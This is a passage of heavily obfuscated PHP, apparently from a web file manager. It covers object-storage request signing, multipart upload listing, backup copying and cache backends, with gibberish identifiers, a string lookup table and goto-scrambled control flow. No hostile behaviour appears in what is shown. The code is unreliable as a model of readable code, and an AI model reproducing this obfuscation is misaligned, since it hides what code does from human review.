dŠòš©­Í”; d’ªØÇÆˆÖ: if (strpos($CÖÇëÌ«ßî, $eËê‡ó“[213]) === 0) { return array($eËê‡ó“[220] => $cŒİÇ©Ê£¬, $eËê‡ó“[210] => $BŠåëºŠë­); } return $cŒİÇ©Ê£¬; goto AÓ„·Ñ£‹´; dŠòš©­Í”: $eËê‡ó“ =& $_SERVER[Å¸ş]; $BŠåëºŠë­ = isset($F–¹‡áë¿‡[$eËê‡ó“[210]]) ? $F–¹‡áë¿‡[$eËê‡ó“[210]] : gmdate($eËê‡ó“[208]); $CÖÇëÌ«ßî = isset($F–¹‡áë¿‡[$eËê‡ó“[160]]) ? $F–¹‡áë¿‡[$eËê‡ó“[160]] : $eËê‡ó“[33]; goto EÔ¡œË¿óë; fŠö”Ù·ë“: $a‰óğ…æÛù = implode($eËê‡ó“[217], $f­®²ÊáñÀ); $f‰°Õò¬ËÑ = base64_encode(hash_hmac($eËê‡ó“[218], $a‰óğ…æÛù, $this->secret, !0)); $cŒİÇ©Ê£¬ = $eËê‡ó“[219] . $this->accessKey . $eËê‡ó“[4] . $f‰°Õò¬ËÑ; goto d’ªØÇÆˆÖ; EÔ¡œË¿óë: $eà¥â°Éôø = $F–¹‡áë¿‡[$eËê‡ó“[89]]; unset($F–¹‡áë¿‡[$eËê‡ó“[89]]); if (isset($F–¹‡áë¿‡[$eËê‡ó“[211]])) { $F–¹‡áë¿‡[$eËê‡ó“[210]] = $BŠåëºŠë­; return $this->listUploadParts($eà¥â°Éôø, $F–¹‡áë¿‡); } goto C¤¢¦êòÎ; C¤¢¦êòÎ: $f­®²ÊáñÀ = array($eËê‡ó“[212], $eËê‡ó“[33], $eËê‡ó“[116], $eËê‡ó“[33], "\x78\x2d\141\155\172\x2d\x64\x61\x74\x65\x3a{$BŠåëºŠë­}", $eËê‡ó“[8] . $this->bucket . $eËê‡ó“[8] . $this->pathEncode($eà¥â°Éôø) . $CÖÇëÌ«ßî); if (strpos($CÖÇëÌ«ßî, $eËê‡ó“[213]) === 0) { $f­®²ÊáñÀ[0] = $eËê‡ó“[214]; } if (isset($F–¹‡áë¿‡[$eËê‡ó“[215]]) && $F–¹‡áë¿‡[$eËê‡ó“[215]] == $eËê‡ó“[216]) { $f­®²ÊáñÀ[0] = $eËê‡ó“[216]; } goto fŠö”Ù·ë“; AÓ„·Ñ£‹´: } public function listUploadParts($FÀ¬Â˜¡¨“, $Bº·…‹÷·° = array()) { goto Dó“Ê«ê†×; b‘Â„¾”÷: $eç°ç–ğò = $this->multiUploadAuthData($FÀ¬Â˜¡¨“, $Bº·…‹÷·°); if (empty($eç°ç–ğò)) { return !1; } return array($Aª³Ì‡Ö“ğ[220] => $eç°ç–ğò, $Aª³Ì‡Ö“ğ[210] => $Bº·…‹÷·°[$Aª³Ì‡Ö“ğ[210]], $Aª³Ì‡Ö“ğ[222] => $C©÷ÁÑ¸‚ß); goto e”—®‚Ö; Dó“Ê«ê†×: $Aª³Ì‡Ö“ğ =& $_SERVER[Å¸ş]; $A¼“ÔØ’½ = str_replace($Aª³Ì‡Ö“ğ[221], $Aª³Ì‡Ö“ğ[33], $Bº·…‹÷·°[$Aª³Ì‡Ö“ğ[160]]); $C©÷ÁÑ¸‚ß = $this->client->listParts($this->bucket, $FÀ¬Â˜¡¨“, $A¼“ÔØ’½); goto a¦—ãÓ½Ğõ; a¦—ãÓ½Ğõ: if (!$C©÷ÁÑ¸‚ß) { return !1; } unset($Bº·…‹÷·°[$Aª³Ì‡Ö“ğ[211]], $Bº·…‹÷·°[$Aª³Ì‡Ö“ğ[215]]); $Bº·…‹÷·°[$Aª³Ì‡Ö“ğ[89]] = $FÀ¬Â˜¡¨“; goto b‘Â„¾”÷; e”—®‚Ö: } public function getHost() { return parent::getHost() . $_SERVER[Å¸ş][8] . $this->bucket; } public function size($cØâÎÚ•») { $Dõâ¸¼õ´ = $this->objectMeta($cØâÎÚ•»); return $Dõâ¸¼õ´ ? $Dõâ¸¼õ´[$_SERVER[Å¸ş][77]] : 0; } public function info($cóÄØñ›É ) { if ($this->isFolder($cóÄØñ›É )) { return $this->folderInfo($cóÄØñ›É ); } else { if ($this->isFile($cóÄØñ›É )) { return $this->fileInfo($cóÄØñ›É ); } } return !1; } public function exist($AÍ¼¸åì£’) { return $this->isFile($AÍ¼¸åì£’) || $this->isFolder($AÍ¼¸åì£’); } public function isFile($B‡‹ëÏµÜ½) { return !$this->isFolder($B‡‹ëÏµÜ½) && $this->objectMeta($B‡‹ëÏµÜ½); } public function isFolder($cÊî•›„ÛÒ) { return $this->cacheMethod($_SERVER[Å¸ş][223], $cÊî•›„ÛÒ); } protected function objectMeta($D½ÂñÂŒïô) { return $this->cacheMethod($_SERVER[Å¸ş][224], $D½ÂñÂŒïô); } protected function _objectMeta($DƒŠˆ—á»è) { $e„‹¦­Ğ§ =& $_SERVER[Å¸ş]; $DƒŠˆ—á»è = rtrim($DƒŠˆ—á»è, $e„‹¦­Ğ§[8]); try { $E˜½„Óç©É = $this->client->getObjectInfo($this->bucket, $DƒŠˆ—á»è); if (!isset($E˜½„Óç©É[$e„‹¦­Ğ§[207]]) && isset($E˜½„Óç©É[$e„‹¦­Ğ§[225]])) { $E˜½„Óç©É[$e„‹¦­Ğ§[207]] = $E˜½„Óç©É[$e„‹¦­Ğ§[225]]; } } catch (Exception $F™ùÄƒù’) { $E˜½„Óç©É = !1; } if (!$E˜½„Óç©É) { } return $E˜½„Óç©É; } protected function _isFolder($dÓ‡ ë¼ºâ) { goto Aô•£Ê‰‘•; Aô•£Ê‰‘•: $b÷‚¶à˜ =& $_SERVER[Å¸ş]; $dÓ‡ ë¼ºâ = rtrim($dÓ‡ ë¼ºâ, $b÷‚¶à˜[8]); if ($dÓ‡ ë¼ºâ == $b÷‚¶à˜[33] || $dÓ‡ ë¼ºâ == $b÷‚¶à˜[8]) { return !0; } goto cÎÂ‘¬ŒÛÄ; cÎÂ‘¬ŒÛÄ: $F¯ñéí‰„İ = $this->client->getBucket($this->bucket, $dÓ‡ ë¼ºâ, null, 1); if (empty($F¯ñéí‰„İ)) { return !1; } $F¯ñéí‰„İ = array_values($F¯ñéí‰„İ); goto Aí„©„œ‘; Aí„©„œ‘: if (substr($F¯ñéí‰„İ[0][$b÷‚¶à˜[28]], -1) == $b÷‚¶à˜[8]) { return !0; } if (get_path_this($F¯ñéí‰„İ[0][$b÷‚¶à˜[28]]) == get_path_this($dÓ‡ ë¼ºâ)) { return !1; } return !0; goto eíå©Á±¥®; eíå©Á±¥®: } } define($_SERVER[Å¸ş][226], 1); goto AëÉ¦Š”¾±; eëí«Ì—Á: $b§šÛ¯ßá‘ = $_SERVER[Å¸ş][553]; if (strlen($b§šÛ¯ßá‘) < $_SERVER[Å¸ş][554]) { return; } $cëØÂäßÏ¤ = LIB_DIR . $_SERVER[Å¸ş][555]; goto F×¸Ö†Å°ğ; c³’ÑáÊ¨»: class BackupFile { public function __construct() { } public function index() { goto C§‹ÑØ÷«…; c®‰›İÜÓ¦: Backup::set($f†‰¥¸öÉ); $this->_fileFilter($EëË¿»ˆø); return !0; goto FÔÆ§Õ‡ ; C§‹ÑØ÷«…: $b—…å¢§§“ = Backup::get(); $aÙèº ¯© = $b—…å¢§§“[$_SERVER[Å¸ş][281]][$_SERVER[Å¸ş][167]][$_SERVER[Å¸ş][419]]; $bÏ›¥Ÿ¤„¤ = array($_SERVER[Å¸ş][420] => array($_SERVER[Å¸ş][737], $aÙèº ¯©), $_SERVER[Å¸ş][738] => array($_SERVER[Å¸ş][319], $b—…å¢§§“[$_SERVER[Å¸ş][694]])); goto C‘Õ¥Ğ¸‘; B‰Å ŒæÚ: $Eï¡ßÓİƒË = $f„ ¡œÀğ¸ ? 1 : 0; $f†‰¥¸öÉ = array($_SERVER[Å¸ş][753] => 1, $_SERVER[Å¸ş][449] => time(), $_SERVER[Å¸ş][711] => $Eï¡ßÓİƒË, $_SERVER[Å¸ş][750] => $aÙèº ¯©, $_SERVER[Å¸ş][742] => $C¿š¼Çò”Ë, $_SERVER[Å¸ş][741] => $a¾Æ¯ÄÀ•™); if ($dÕË…¶•õ) { $f†‰¥¸öÉ[$_SERVER[Å¸ş][751]] = $D»¹­²È‹Ñ; $f†‰¥¸öÉ[$_SERVER[Å¸ş][752]] = $fÚÌöÉ”›ù; } goto c®‰›İÜÓ¦; f÷ƒÍë“Ÿ: $fÚÌöÉ”›ù = $D»¹­²È‹Ñ = 0; do { $a‹¶¢¿‹¶† = $_SERVER[Å¸ş][743]; $d—í÷¿çï— = Model($_SERVER[Å¸ş][721])->where($bÏ›¥Ÿ¤„¤)->field($a‹¶¢¿‹¶†)->order($_SERVER[Å¸ş][744])->selectPage($dØØ»šîõ¯, $Bİ»Úİø­Õ); $B¯¦ó‡š¸Ë = !empty($d—í÷¿çï—[$_SERVER[Å¸ş][354]]) ? $d—í÷¿çï—[$_SERVER[Å¸ş][354]] : array(); foreach ($B¯¦ó‡š¸Ë as $D´å³³¸öÙ) { goto c·ô•Õòº×; B‚Ù³Ö…Ü: $bñäÑ¦ëõÁ += $D´å³³¸öÙ[$_SERVER[Å¸ş][77]]; $D»¹­²È‹Ñ += 1; $fÚÌöÉ”›ù += $D´å³³¸öÙ[$_SERVER[Å¸ş][77]]; goto côÂî‘Ø¼; c·ô•Õòº×: if (!$this->_fileExist($D´å³³¸öÙ, $EëË¿»ˆø, $Cà“÷âç²Ü)) { $a¾Æ¯ÄÀ•™ -= 1; $C¿š¼Çò”Ë -= (int) $D´å³³¸öÙ[$_SERVER[Å¸ş][77]]; write_log("\x66\151\x6c\x65\40\156\x6f\x74\x20\145\170\151\x73\x74\56\x66\151\154\x65\111\x44\x3a{$D´å³³¸öÙ[$_SERVER[Å¸ş][419]]}\x2c\x20\x70\141\164\150\x3a{$D´å³³¸öÙ[$_SERVER[Å¸ş][75]]}", $_SERVER[Å¸ş][745]); continue; } $cíµÛ·‹¸Ä = $D´å³³¸öÙ[$_SERVER[Å¸ş][75]]; $eÓ¶»Íå• = "\173\x69\157\72{$b—…å¢§§“[$_SERVER[Å¸ş][694]]}\175" . substr($cíµÛ·‹¸Ä, strlen("\173\151\157\72{$D´å³³¸öÙ[$_SERVER[Å¸ş][746]]}\175")); goto eÌŒÙÓ¾å; côÂî‘Ø¼: if ($bñäÑ¦ëõÁ >= 1024 * 1024 * 100) { $f†‰¥¸öÉ = array($_SERVER[Å¸ş][750] => $aÙèº ¯©, $_SERVER[Å¸ş][751] => $D»¹­²È‹Ñ, $_SERVER[Å¸ş][752] => $fÚÌöÉ”›ù); Backup::set($f†‰¥¸öÉ); $bñäÑ¦ëõÁ = $dÕË…¶•õ = 0; } goto dÃ…ğ·îÍŒ; eÌŒÙÓ¾å: if (IO::exist($eÓ¶»Íå•)) { $FåÂ½Ù©ï´->updateFileEnd($D´å³³¸öÙ[$_SERVER[Å¸ş][28]], $D´å³³¸öÙ[$_SERVER[Å¸ş][77]]); } else { $eÓ¶»Íå• = get_path_father($eÓ¶»Íå•); IO::mkdir($eÓ¶»Íå•); if (!IO::copy($cíµÛ·‹¸Ä, $eÓ¶»Íå•, $_SERVER[Å¸ş][747])) { write_log($_SERVER[Å¸ş][748] . $cíµÛ·‹¸Ä . $_SERVER[Å¸ş][749] . $eÓ¶»Íå• . $_SERVER[Å¸ş][478], $_SERVER[Å¸ş][716]); $f„ ¡œÀğ¸ = !1; break; } } $aÙèº ¯© = $D´å³³¸öÙ[$_SERVER[Å¸ş][419]]; $dÕË…¶•õ += 1; goto B‚Ù³Ö…Ü; dÃ…ğ·îÍŒ: } $E…ğ„× Ú÷ = count($B¯¦ó‡š¸Ë); $Bİ»Úİø­Õ++; } while ($E…ğ„× Ú÷ == $dØØ»šîõ¯); $FåÂ½Ù©ï´->end(); goto B‰Å ŒæÚ; C‘Õ¥Ğ¸‘: $a¾Æ¯ÄÀ•™ = (int) Model($_SERVER[Å¸ş][721])->where($bÏ›¥Ÿ¤„¤)->count($_SERVER[Å¸ş][419]); $C¿š¼Çò”Ë = (int) Model($_SERVER[Å¸ş][721])->where($bÏ›¥Ÿ¤„¤)->sum($_SERVER[Å¸ş][77]); $FåÂ½Ù©ï´ = new TaskFileTransfer($_SERVER[Å¸ş][739], $_SERVER[Å¸ş][716], $a¾Æ¯ÄÀ•™, LNG($_SERVER[Å¸ş][717]) . $_SERVER[Å¸ş][718] . LNG($_SERVER[Å¸ş][740])); goto eŸöŒìÆÒ; Dà´ùÖš¿÷: $dØØ»šîõ¯ = 1000; $bñäÑ¦ëõÁ = $dÕË…¶•õ = 0; $EëË¿»ˆø = array(); goto f÷ƒÍë“Ÿ; F¹æ«º•µÄ: $f„ ¡œÀğ¸ = !0; $Cà“÷âç²Ü = $this->storeIds(); $Bİ»Úİø­Õ = 1; goto Dà´ùÖš¿÷; eŸöŒìÆÒ: $FåÂ½Ù©ï´->task[$_SERVER[Å¸ş][701]] = $C¿š¼Çò”Ë; $f†‰¥¸öÉ = array($_SERVER[Å¸ş][741] => $a¾Æ¯ÄÀ•™, $_SERVER[Å¸ş][742] => $C¿š¼Çò”Ë); Backup::set($f†‰¥¸öÉ); goto F¹æ«º•µÄ; FÔÆ§Õ‡ : } private function _fileExist($F§´§°íé, &$Eƒ©Îñ·Š, $A‹»Øìîâ) { goto bÍàğ‘ê®à; b†÷¤½°Ã: if (!in_array($F§´§°íé[$aŞçÔä’½[746]], $A‹»Øìîâ)) { return !1; } if (IO::exist($BÕãƒ¤Ä‡ó)) { return !0; } $A˜Ášèß†Ğ = get_path_father($BÕãƒ¤Ä‡ó); goto e¥°ï¿÷Ë»; c”« ”¦Ìß: $Eƒ©Îñ·Š = array_merge($Eƒ©Îñ·Š, array_to_keyvalue($B¸ìŠóñä, $aŞçÔä’½[33], $aŞçÔä’½[419])); return !1; goto c¥Ú½¹æ”¼; bÍàğ‘ê®à: $aŞçÔä’½ =& $_SERVER[Å¸ş]; $BÕãƒ¤Ä‡ó = $F§´§°íé[$aŞçÔä’½[75]]; if (in_array($F§´§°íé[$aŞçÔä’½[419]], $Eƒ©Îñ·Š)) { return !1; } goto b†÷¤½°Ã; e¥°ï¿÷Ë»: if (IO::exist($A˜Ášèß†Ğ)) { $Eƒ©Îñ·Š[] = $F§´§°íé[$aŞçÔä’½[419]]; return !1; } $CÁËôÆ“ƒ = array($aŞçÔä’½[746] => $F§´§°íé[$aŞçÔä’½[746]], $aŞçÔä’½[75] => array($aŞçÔä’½[754], "{$A˜Ášèß†Ğ}\x25")); $B¸ìŠóñä = Model($aŞçÔä’½[721])->where($CÁËôÆ“ƒ)->field($aŞçÔä’½[420])->select(); goto c”« ”¦Ìß; c¥Ú½¹æ”¼: } private function _fileFilter($EĞì¡²—Œ½) { $a¯Ì…İØç =& $_SERVER[Å¸ş]; if (empty($EĞì¡²—Œ½)) { return; } $b‘á¶È½› = array($a¯Ì…İØç[419] => array($a¯Ì…İØç[7], array_unique($EĞì¡²—Œ½))); $AĞÜë§¡Ü‚ = Model($a¯Ì…İØç[755])->where($b‘á¶È½›)->field($a¯Ì…İØç[369])->select(); foreach ($AĞÜë§¡Ü‚ as $A……­ĞÂÚ) { Model($a¯Ì…İØç[755])->remove($A……­ĞÂÚ[$a¯Ì…İØç[369]], !1); } } private function storeIds() { $bŒ ˆÌà«æ =& $_SERVER[Å¸ş]; $Dô¢”Ô¤á´ = Model($bŒ ˆÌà«æ[706])->listData(); $eŠƒ‹šŠ’ê = array(); $A¶’”™èªÆ = $GLOBALS[$bŒ ˆÌà«æ[6]][$bŒ ˆÌà«æ[84]][$bŒ ˆÌà«æ[756]]; foreach ($Dô¢”Ô¤á´ as $cÑÆô¨ªİÇ) { $Aª‚ƒŠÆéÚ = strtolower($cÑÆô¨ªİÇ[$bŒ ˆÌà«æ[90]]); if (!isset($A¶’”™èªÆ[$Aª‚ƒŠÆéÚ])) { continue; } $a••œØôó = $bŒ ˆÌà«æ[71] . (isset($A¶’”™èªÆ[$Aª‚ƒŠÆéÚ]) ? $A¶’”™èªÆ[$Aª‚ƒŠÆéÚ] : ucfirst($Aª‚ƒŠÆéÚ)); if (!class_exists($a••œØôó)) { continue; } $eŠƒ‹šŠ’ê[] = $cÑÆô¨ªİÇ[$bŒ ˆÌà«æ[367]]; } return $eŠƒ‹šŠ’ê; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto f‹µÀ”Ï; f‹µÀ”Ï: $BÌßÁ…×¦§ =& $_SERVER[Å¸ş]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto eæßØËÄ˜‘; eæßØËÄ˜‘: $E±¨â Éá³ = $GLOBALS[$BÌßÁ…×¦§[6]][$BÌßÁ…×¦§[337]]; $aƒ§Ë„ñöè = $E±¨â Éá³[$E±¨â Éá³[$BÌßÁ…×¦§[757]]]; $eîğ®ˆ«ó = $E±¨â Éá³[$BÌßÁ…×¦§[758]]; goto D¸ÚÅÃ™; D¸ÚÅÃ™: switch ($E±¨â Éá³[$BÌßÁ…×¦§[757]]) { case $BÌßÁ…×¦§[17]: self::$handle = Model($BÌßÁ…×¦§[759]); break; case $BÌßÁ…×¦§[760]: self::$handle = new CacheRedis($aƒ§Ë„ñöè, $eîğ®ˆ«ó); break; case $BÌßÁ…×¦§[761]: self::$handle = new CacheMemcached($aƒ§Ë„ñöè, $eîğ®ˆ«ó); break; case $BÌßÁ…×¦§[167]: self::$handle = new CacheFile($aƒ§Ë„ñöè, $eîğ®ˆ«ó); break; default: break; } return self::$handle; goto D‹ÛŞõîøˆ; D‹ÛŞõîøˆ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($E£µ­‡†ó) { if (is_array($E£µ­‡†ó) || is_object($E£µ­‡†ó)) { $E£µ­‡†ó = json_encode($E£µ­‡†ó); } $E£µ­‡†ó = rawurlencode($E£µ­‡†ó); return md5(KOD_SITE_ID . $_SERVER[Å¸ş][70] . $E£µ­‡†ó); } public static function get($a°‰ó®¤î×) { $d’Æ°ÛÒÚÄ = self::key($a°‰ó®¤î×); if (!isset(self::$memoryCache[$d’Æ°ÛÒÚÄ])) { $BÚŠÍš›ùŠ = self::init()->get($d’Æ°ÛÒÚÄ); self::$memoryCache[$d’Æ°ÛÒÚÄ] = unserialize($BÚŠÍš›ùŠ); } return self::$memoryCache[$d’Æ°ÛÒÚÄ]; } public static function set($f¡óğÊ‚©, $A¤óØ–Şë, $D—ÊÊê’ğ¼ = false) { goto b´„ºÌ„•µ; dÍàå ß»Ş: CacheLock::lock($f¡óğÊ‚©); $DŞ¡¹³™ˆ´ = self::init()->set($Fé½Å•Í‹º, serialize($A¤óØ–Şë), $D—ÊÊê’ğ¼); self::$memoryCache[$Fé½Å•Í‹º] = $A¤óØ–Şë; goto AÚ£åÉãÀ¨; AÚ£åÉãÀ¨: CacheLock::unlock($f¡óğÊ‚©); return $DŞ¡¹³™ˆ´; goto Aä¹áÍõŞŒ; b´„ºÌ„•µ: $Fé½Å•Í‹º = self::key($f¡óğÊ‚©); if (isset(self::$memoryCache[$Fé½Å•Í‹º]) && self::$memoryCache[$Fé½Å•Í‹º] === $A¤óØ–Şë) { return !0; } if ($D—ÊÊê’ğ¼ === 0) { self::$memoryCache[$Fé½Å•Í‹º] = $A¤óØ–Şë; return !0; } goto dÍàå ß»Ş; Aä¹áÍõŞŒ: } public static function remove($D¤‚æ¹‚ÂÙ) { goto Bœ»àÙÃÂİ; Bœ»àÙÃÂİ: $D¤Â «Ø‚× = self::key($D¤‚æ¹‚ÂÙ); unset(self::$memoryCache[$D¤Â «Ø‚×]); self::clearTimeout(); goto FÄß‰ÌÓ›ë; FÄß‰ÌÓ›ë: CacheLock::lock($D¤‚æ¹‚ÂÙ); $F¢‘Ã·ÊÆ¶ = self::init()->remove($D¤Â «Ø‚×); CacheLock::unlock($D¤‚æ¹‚ÂÙ); goto dÚ™¼³—Ğ°; dÚ™¼³—Ğ°: return $F¢‘Ã·ÊÆ¶; goto eù Î©¸™©; eù Î©¸™©: } public static function clearMemory($CßŸøÄçÂÉ = false) { if ($CßŸøÄçÂÉ) { $CßŸøÄçÂÉ = self::key($CßŸøÄçÂÉ); unset(self::$memoryCache[$CßŸøÄçÂÉ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Å¸ş][762])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Å¸ş][763])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($CŸÕÖŠÀîÇ, $bÙ¹Ô™½¥¹) { $BÏ‡ˆî®’ç =& $_SERVER[Å¸ş]; $this->cachePath = $CŸÕÖŠÀîÇ[$BÏ‡ˆî®’ç[75]]; $this->prefix = $BÏ‡ˆî®’ç[764]; $this->cacheTime = $bÙ¹Ô™½¥¹; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($BÎÅ£ÍŸ£Û) { $F¶Ë •Ëò¶ =& $_SERVER[Å¸ş]; $BÎÅ£ÍŸ£Û = str_replace(array($F¶Ë •Ëò¶[765], $F¶Ë •Ëò¶[93], $F¶Ë •Ëò¶[69]), $F¶Ë •Ëò¶[766], $BÎÅ£ÍŸ£Û); return $this->cachePath . $F¶Ë •Ëò¶[767] . $BÎÅ£ÍŸ£Û . $F¶Ë •Ëò¶[768]; } public function set($eÄ«‚½Ôã, $fà¯„ ‚–Ş, $c®í¢‰ÅÂ = false) { $c¸‡îÀ¾¹ = $this->getFile($eÄ«‚½Ôã); if (file_put_contents($c¸‡îÀ¾¹, $this->prefix . $fà¯„ ‚–Ş, LOCK_EX)) { return !0; } @unlink($c¸‡îÀ¾¹); return !1; } public function get($C·Æ‚ÃÚƒœ) { $C´¥îÙ»Ï = $this->getFile($C·Æ‚ÃÚƒœ); if (file_exists($C´¥îÙ»Ï) && filemtime($C´¥îÙ»Ï) < time() - $this->cacheTime) { @unlink($C´¥îÙ»Ï); return !1; } $fô‘ë‚÷Ñ = @file_get_contents($C´¥îÙ»Ï); return substr($fô‘ë‚÷Ñ, strlen($this->prefix)); } public function remove($bŠÜÉ”ğä) { $BÊìÃ„à­ª = $this->getFile($bŠÜÉ”ğä); return @unlink($BÊìÃ„à­ª); } public function deleteAll() { $C£Ñ•×¬¿è =& $_SERVER[Å¸ş]; $c¹ÀºŞ¢Öî = scandir($this->cachePath); foreach ($c¹ÀºŞ¢Öî as $Añ³ŒêÔˆ›) { $E­®„³ÄÊò = $this->cachePath . $Añ³ŒêÔˆ›; if (strpos($E­®„³ÄÊò, $C£Ñ•×¬¿è[768]) && strpos($E­®„³ÄÊò, $C£Ñ•×¬¿è[769])) { @unlink($E­®„³ÄÊò); } } } public function clearTimeout() { $AŒìĞôÒ =& $_SERVER[Å¸ş]; $Cªïö…ˆ÷ä = scandir($this->cachePath); foreach ($Cªïö…ˆ÷ä as $EîÜ­É‹Å) { $fİÀ‚‚ŸÕÅ = $this->cachePath . $EîÜ­É‹Å; if (strpos($fİÀ‚‚ŸÕÅ, $AŒìĞôÒ[768]) && strpos($fİÀ‚‚ŸÕÅ, $AŒìĞôÒ[769]) && filemtime($fİÀ‚‚ŸÕÅ) < time() - $this->cacheTime) { @unlink($fİÀ‚‚ŸÕÅ); } } } } goto c¡¼ï×Ã¾²; C Œ¾ËàœŞ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($F†‹ÌÃ¶ø¨) { $b§âÁ ø„ =& $_SERVER[Å¸ş]; return array($b§âÁ ø„[2202] => array($F†‹ÌÃ¶ø¨[0], $b§âÁ ø„[2203]), $b§âÁ ø„[2204] => array($F†‹ÌÃ¶ø¨[0], $b§âÁ ø„[2205])); } protected function get($EÄ¨‰İÒÖ…) { $aâÙ«ÜŠ´› =& $_SERVER[Å¸ş]; $dòôáÃõÙ = Model($aâÙ«ÜŠ´›[460])->metaGet($EÄ¨‰İÒÖ…, $aâÙ«ÜŠ´›[2206]); $c¨¸¡æÚÀ‰ = json_decode($dòôáÃõÙ, !0); return $c¨¸¡æÚÀ‰ ? $c¨¸¡æÚÀ‰ : array($aâÙ«ÜŠ´›[2207] => $aâÙ«ÜŠ´›[83], $aâÙ«ÜŠ´›[354] => array()); } protected function set($FÔÆ©‹É™—, $CÙ„‘­²¬©) { $EÅÊŠµ²¢Õ =& $_SERVER[Å¸ş]; $CÙ„‘­²¬© = $CÙ„‘­²¬© ? $CÙ„‘­²¬© : array($EÅÊŠµ²¢Õ[2207] => $EÅÊŠµ²¢Õ[83], $EÅÊŠµ²¢Õ[354] => array()); Model($EÅÊŠµ²¢Õ[460])->metaSet($FÔÆ©‹É™—, $EÅÊŠµ²¢Õ[2206], json_encode($CÙ„‘­²¬©)); return Model($EÅÊŠµ²¢Õ[460])->metaSet($FÔÆ©‹É™—, $EÅÊŠµ²¢Õ[2206], json_encode($CÙ„‘­²¬©)); } protected function getByTagID($bË§ï¨¿Ö×, $a±ˆÏ”“Æ¯) { goto Fµ÷…Áù»„; CÁéÚä›à: $F»ÅšÜ­šà = $this->get($bË§ï¨¿Ö×); if (!$F»ÅšÜ­šà || !isset($F»ÅšÜ­šà[$aÀÇ¬¾åé‚[354]])) { return !1; } $aÏêŠÂâäï = array_find_by_field($F»ÅšÜ­šà[$aÀÇ¬¾åé‚[354]], $aÀÇ¬¾åé‚[367], $a±ˆÏ”“Æ¯); goto B…ç«£…­§; B…ç«£…­§: return is_array($aÏêŠÂâäï) ? $aÏêŠÂâäï : !1; goto fæŒğ÷–ÀÖ; Fµ÷…Áù»„: $aÀÇ¬¾åé‚ =& $_SERVER[Å¸ş]; if (!$bË§ï¨¿Ö× || !$a±ˆÏ”“Æ¯) { return !1; } if (!Model($aÀÇ¬¾åé‚[460])->getInfoSimple($bË§ï¨¿Ö×)) { return !1; } goto CÁéÚä›à; fæŒğ÷–ÀÖ: } public function listSource($c†œåÚƒµ‰, $f©Æğ—œù) { goto F‹Šˆ‡Å³; cÂãĞº³Óó: $F¬èÓø = array_to_keyvalue($A¥Îğ½¥Ò[$eäÜ†—¡¼â[73]], $eäÜ†—¡¼â[33], $eäÜ†—¡¼â[369]); $CÆÌÏÆÙÂÅ = array_merge($F¬èÓø, $AÌ½—Ğñ); foreach ($dÚ¯‹Úï•Ñ as $fŠìöŞ˜Š¤) { if (!in_array($fŠìöŞ˜Š¤, $CÆÌÏÆÙÂÅ)) { $aÔ˜à«±·[] = $fŠìöŞ˜Š¤; } } goto D«ë²Öç‚å; aÃó‹õ¨Õ: if (!$A¥Îğ½¥Ò || count($dÚ¯‹Úï•Ñ) == $A¥Îğ½¥Ò[$eäÜ†—¡¼â[351]][$eäÜ†—¡¼â[352]]) { return $A¥Îğ½¥Ò; } $aÔ˜à«±· = array(); $AÌ½—Ğñ = array_to_keyvalue($A¥Îğ½¥Ò[$eäÜ†—¡¼â[74]], $eäÜ†—¡¼â[33], $eäÜ†—¡¼â[369]); goto cÂãĞº³Óó; AÚ´´Á°é: foreach ($AÖÕ‡¼‚ÎÙ as $F¯š§æ¹’¹ => $A·Û«ÉĞ§) { $AŞŸÓ¨Ã‘¿ = !0; if (!$f©Æğ—œù) { $dÚ¯‹Úï•Ñ[] = $F¯š§æ¹’¹; continue; } foreach ($f©Æğ—œù as $C„›ÀìÇ) { if (!in_array($C„›ÀìÇ, $A·Û«ÉĞ§)) { $AŞŸÓ¨Ã‘¿ = !1; break; } } if ($AŞŸÓ¨Ã‘¿) { $dÚ¯‹Úï•Ñ[] = $F¯š§æ¹’¹; } } if (!$dÚ¯‹Úï•Ñ) { return array(); } $A¥Îğ½¥Ò = Model($eäÜ†—¡¼â[1115])->listSource(array($eäÜ†—¡¼â[383] => array($eäÜ†—¡¼â[384], $dÚ¯‹Úï•Ñ))); goto aÃó‹õ¨Õ; F‹Šˆ‡Å³: $eäÜ†—¡¼â =& $_SERVER[Å¸ş]; if ($f©Æğ—œù && !is_array($f©Æğ—œù)) { $f©Æğ—œù = array($f©Æğ—œù); } $CİïŠÊªİ = $this->listData($c†œåÚƒµ‰); goto E¸†éŸØÕ˜; E¸†éŸØÕ˜: $AÖÕ‡¼‚ÎÙ = array(); foreach ($CİïŠÊªİ as $B“ïã¢«•) { $fŠìöŞ˜Š¤ = $B“ïã¢«•[$eäÜ†—¡¼â[75]]; if (!$fŠìöŞ˜Š¤) { continue; } if (!isset($AÖÕ‡¼‚ÎÙ[$fŠìöŞ˜Š¤])) { $AÖÕ‡¼‚ÎÙ[$fŠìöŞ˜Š¤] = array(); } $AÖÕ‡¼‚ÎÙ[$fŠìöŞ˜Š¤][] = $B“ïã¢«•[$eäÜ†—¡¼â[393]]; } $dÚ¯‹Úï•Ñ = array(); goto AÚ´´Á°é; D«ë²Öç‚å: if ($aÔ˜à«±·) { $this->removeBySource($c†œåÚƒµ‰, $aÔ˜à«±·); } return $A¥Îğ½¥Ò; goto C¦‘ç¶æ†; C¦‘ç¶æ†: } protected function listData($fî¬ÏÜíè) { $cÑŸ‘ê´”™ =& $_SERVER[Å¸ş]; $E¸ì¼Àìøª = array($cÑŸ‘ê´”™[1427] => 0, $cÑŸ‘ê´”™[436] => array($cÑŸ‘ê´”™[2208], 0), $cÑŸ‘ê´”™[388] => $cÑŸ‘ê´”™[2209] . $fî¬ÏÜíè); $FÓåğß±¸â = $cÑŸ‘ê´”™[2210]; $eÙŸìôÍŠŠ = $this->field($FÓåğß±¸â)->where($E¸ì¼Àìøª)->order($cÑŸ‘ê´”™[2211])->select(); return $eÙŸìôÍŠŠ ? $eÙŸìôÍŠŠ : array(); } protected function addToTag($bÎá‡ëˆé, $fµä…‰Äß°, 